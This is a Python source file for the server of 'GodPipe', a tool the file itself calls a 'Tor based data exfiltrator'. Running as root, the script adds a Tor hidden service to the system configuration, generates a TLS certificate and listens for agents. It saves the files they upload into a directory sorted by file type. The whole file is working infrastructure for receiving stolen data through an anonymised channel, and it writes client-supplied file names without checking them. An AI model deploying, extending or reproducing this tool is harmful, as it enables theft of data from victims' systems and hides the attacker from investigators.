import socket, re, ssl, subprocess
from pathlib import Path
from colorama import init, Fore, Style

# Initialize for colored output
init()


def banner():
    print(f"""{Fore.GREEN}
          
     ██████╗  ██████╗ ██████╗ ██████╗ ██╗██████╗ ███████╗
    ██╔════╝ ██╔═══██╗██╔══██╗██╔══██╗██║██╔══██╗██╔════╝
    ██║  ███╗██║   ██║██║  ██║██████╔╝██║██████╔╝█████╗  
    ██║   ██║██║   ██║██║  ██║██╔═══╝ ██║██╔═══╝ ██╔══╝  
    ╚██████╔╝╚██████╔╝██████╔╝██║     ██║██║     ███████╗
     ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝
                                                
                  {Style.RESET_ALL}Tor based data exfiltrator           
                         By {Fore.RED}@Slayer0x{Style.RESET_ALL}""")

def checkroot():
    # Run 'id -u' to get the current user's UID
    result = subprocess.run(['id', '-u'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Check if the UID is 0 (root user)
    if result.returncode == 0 and int(result.stdout.decode().strip()) != 0:
        print(f"\n{Fore.RED} [!] The script must be executed as a privileged user (root).\n {Style.RESET_ALL}")
        exit(1)

def certs_generated():

    checkroot() # Checks root privileges ;)  

    dir_path = './certs'
    if not Path(dir_path).exists():
        # Display banner
        subprocess.run(["clear"]) 
        banner()

        # Add to the tor config file the service port 
        local_port = input(f"\n{Fore.YELLOW} [?] Which port number do you want GodPipe server to use (Don't use the same you choosed when creating the relay): {Style.RESET_ALL}")
        print(f"\n{Fore.CYAN} [i] Modifying tor configuration and creating certificates, please wait... {Style.RESET_ALL}")
        
        with open('/etc/tor/torrc', 'a') as f: # Open the tor config file and write the values supplied by the user 
            f.write('HiddenServiceDir /var/lib/tor/hidden_service/\n')  
            f.write('HiddenServicePort ' + str(local_port) + ' 127.0.0.1:' + str(local_port) + '\n') 

        subprocess.run(["systemctl", "restart", "tor@default"]) # Restart the tor process 
        tor_address = subprocess.run(["cat", "/var/lib/tor/hidden_service/hostname"], capture_output=True, text=True).stdout.strip() # Get the tor hidden value address 
        
        # Display banner
        subprocess.run(["clear"]) 
        banner()

        print(f"\n{Fore.GREEN} [i] Your tor hidden service address is: {Style.RESET_ALL}" + str(tor_address))  
        
        # Generate certificates for the godpipe server  
        subprocess.run(["mkdir", "certs"])
        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:4096", "-keyout", "certs/server.key", "-out", "certs/server.crt", "-days", "365", "-nodes", "-subj", "/CN=" + str(tor_address)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return int(local_port)
    else:
        try:
            # If the configuration file is already created, extract the local port used 
            tor_address = subprocess.run(["cat", "/var/lib/tor/hidden_service/hostname"], capture_output=True, text=True).stdout.strip() # Get the tor hidden value address
            
            # Extract the tor hidden service local_port used by opening the config file and regex. 
            with open('/etc/tor/torrc', "r") as file:
                content = file.read()
            pattern = r"(?<!#)\bHiddenServicePort\s+\d+\s+\d+\.\d+\.\d+\.\d+:(\d+)"
            matches = re.findall(pattern, content)
            if matches:
                local_port = int(matches[0]) # Convert the port number to a integer value.
            
            # Display banner 
            subprocess.run(["clear"])
            banner()

            print(f"\n{Fore.GREEN} [i] Your tor hidden service address is: {Style.RESET_ALL}" + str(tor_address))    
            return int(local_port) 
        except:
                print(f"\n{Fore.RED} [!] Error, delete /etc/tor/torrc and ./certs directory and execute the relay_setup.sh & godpipe_server script again{Style.RESET_ALL}\n")
                exit(1)
    

def handle_client(connection, client_address):
    print(f"\n{Fore.MAGENTA} [i] Client connected:{Style.RESET_ALL} {client_address}")
    try:
        # Get file name
        file_name = connection.recv(1024).decode().strip()
        print(f"{Fore.YELLOW}\n [+] Receiving file name{Style.RESET_ALL}: {file_name}")

        # Sending confirmation to the client
        connection.sendall(b"OK")

        # Ensure the Output directory exists using subprocess
        output_dir = Path("Output")
        subprocess.run(["mkdir", "-p", str(output_dir)], check=True)

        # Temporary file path in Output/
        temp_file_path = output_dir / file_name

        # Receive the file
        with open(temp_file_path, "wb") as file:  # Write the file into the output directory
            while True:
                data = connection.recv(65536)

                if data == b"EOF":  # Client sends this string when there's no more data to be sent.
                    break

                if not data:  # If no data is received, we stop.
                    break

                file.write(data)
                connection.sendall(b"CHUNK_RECEIVED")  # Sync signal to the client for each chunk received.

        # Determine file extension and corresponding directory
        file_extension = temp_file_path.suffix.lower().lstrip(".")  # Extract extension without dot
        sub_dir = output_dir / (file_extension if file_extension else "others")

        # Create subdirectory if it doesn't exist
        subprocess.run(["mkdir", "-p", str(sub_dir)], check=True)

        # Move file to its corresponding subdirectory using subprocess
        final_path = sub_dir / file_name
        subprocess.run(["mv", str(temp_file_path), str(final_path)], check=True)

        print(f"\n{Fore.GREEN} [V] {file_name} received and saved to {output_dir}{Style.RESET_ALL}")

    finally:
        connection.close()

def start_server(certfile, keyfile, local_port, host="127.0.0.1"):
    
    # Start the server using the SSL certificate generated 
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)
    
    # We use sockets to stablish a secure channel with the server certificates.
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, local_port))
        server_socket.listen(5)
        print(f"\n{Fore.GREEN} [V] Server listening at {Style.RESET_ALL}{host}:{local_port} ...")
        
        # Handle client connection and check if the certificate supplied is valid
        with context.wrap_socket(server_socket, server_side=True) as secure_socket:
            while True:
                try: #If everyhing goes as intented handle the connection with the client
                    client_connection, client_address = secure_socket.accept()
                    handle_client(client_connection, client_address)
                except ssl.SSLError as e: # Wrong certificate  
                    print(f"{Fore.RED}\n [!] A client tried to connect using an invalid certificate [!]{Style.RESET_ALL}")
                except Exception as e: # Other errors  
                    print(f"{Fore.RED}\n [!] An error ocurred stablishing the connection with the agent:{Style.RESET_ALL} {e}")

if __name__ == "__main__":

    try:
        local_port = certs_generated() # Server first time setup & Certificates generation 
        start_server("certs/server.crt", "certs/server.key", local_port) # Runs the server

    except KeyboardInterrupt:
        print(f"\n{Fore.RED} [!] Exiting...{Style.RESET_ALL}\n")
        exit(0)  # Exit the script with code 0 (no error if CTRL + C)